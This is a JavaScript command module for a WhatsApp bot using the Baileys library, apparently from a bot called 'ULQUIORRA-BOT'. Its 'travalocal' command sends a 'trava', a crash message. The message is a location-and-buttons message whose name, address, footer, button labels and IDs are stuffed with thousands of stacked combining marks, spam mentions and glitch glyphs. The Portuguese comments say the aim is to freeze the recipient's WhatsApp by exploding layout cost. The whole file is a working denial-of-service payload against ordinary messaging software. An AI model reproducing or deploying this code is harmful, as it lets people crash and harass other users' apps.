import { generateWAMessageFromContent } from "baileys";
import { PREFIX } from "../../config.js";
import { WarningError } from "../../errors/index.js";

const DEFAULT_LAT = -23.5505199;
const DEFAULT_LNG = -46.6333025;

const SPAM = "~.*@45*.🚀.*@8401*.🚀.*@5616*.~~.";

const GLITCH = "𖤐⃟𝆺𝅥⃝🩸⛧☠︎☣︎⸸𓂀𓆩𖣘𓆪༒︎▓▒░";

const MARK_RANGES = [
  [0x0300, 0x036f],
  [0x0483, 0x0489],
  [0x1ab0, 0x1aff],
  [0x1dc0, 0x1dff],
  [0x20d0, 0x20ff],
  [0xfe20, 0xfe2f],
];

const randomMark = () => {
  const [min, max] = MARK_RANGES[Math.floor(Math.random() * MARK_RANGES.length)];
  return String.fromCodePoint(min + Math.floor(Math.random() * (max - min + 1)));
};

// Empilha marcas combinantes em cada caractere: o custo de layout explode.
const zalgo = (text, intensity = 8) =>
  [...text]
    .map((char) => {
      if (char === " ") return char;
      let out = char;
      for (let i = 0; i < intensity; i += 1) out += randomMark();
      return out;
    })
    .join("");

const glitchBlock = (repeat) => zalgo(SPAM.repeat(repeat), 5) + GLITCH;

const parseCoord = (value, fallback, limit) => {
  const parsed = Number(String(value ?? "").replace(",", "."));

  if (!Number.isFinite(parsed) || Math.abs(parsed) > limit) return fallback;

  return parsed;
};

export default {
  name: "TravaLocal",
  description: "Trava o WhatsApp com uma localização e botões com texto combinante em massa.",
  commands: ["travalocal", "travamap"],
  usage: `${PREFIX}travalocal [lat] [lng]`,

  handle: async ({ remoteJid, socket, webMessage, args, sendReply, sendSuccessReact }) => {
    const latitude = parseCoord(args?.[0], DEFAULT_LAT, 90);
    const longitude = parseCoord(args?.[1], DEFAULT_LNG, 180);

    if (!Number.isFinite(latitude) || !Number.isFinite(longitude)) {
      throw new WarningError(`Use: ${PREFIX}travalocal -23.55 -46.63`);
    }

    await sendReply("⏳ Cravando o botão na localização...");

    const contentText = [
      "꧁༺𖤐⃟𝆺𝅥⃝🩸𝙐𝙇𝙌𝙐𝙄𝙊𝙍𝙍𝘼-𝘽𝙊𝙏🩸⃝𝆺𝅥⃟𖤐༻꧂",
      "",
      zalgo("T R A V A   D E   B O T A O   +   L O C A L I Z A C A O", 12),
      "",
      glitchBlock(4),
      "",
      zalgo("toque no botao. depois tente voltar pro chat.", 6),
    ].join("\n");

    const makeButton = (id, label, intensity) => ({
      buttonId: `${id}${GLITCH.repeat(6)}`,
      buttonText: { displayText: zalgo(label, intensity) + GLITCH.repeat(4) },
      type: 1,
    });

    const message = generateWAMessageFromContent(
      remoteJid,
      {
        buttonsMessage: {
          headerType: 6,
          locationMessage: {
            degreesLatitude: latitude,
            degreesLongitude: longitude,
            name: zalgo("TRAVA", 24) + glitchBlock(6),
            address: zalgo(SPAM.repeat(3), 8) + GLITCH.repeat(10),
          },
          contentText,
          footerText: SPAM.repeat(20) + GLITCH.repeat(12),
          buttons: [
            makeButton("t1", "ABRIR E REZAR", 9),
            makeButton("t2", "NAO ARRASTA A BARRA", 9),
            makeButton("t3", "O APP VAI ENGASGAR", 9),
          ],
        },
      },
      {
        quoted: JSON.parse(JSON.stringify(webMessage)),
        userJid: socket.user?.id,
      },
    );

    await socket.relayMessage(remoteJid, message.message, { messageId: message.key.id });

    await sendSuccessReact();
  },
};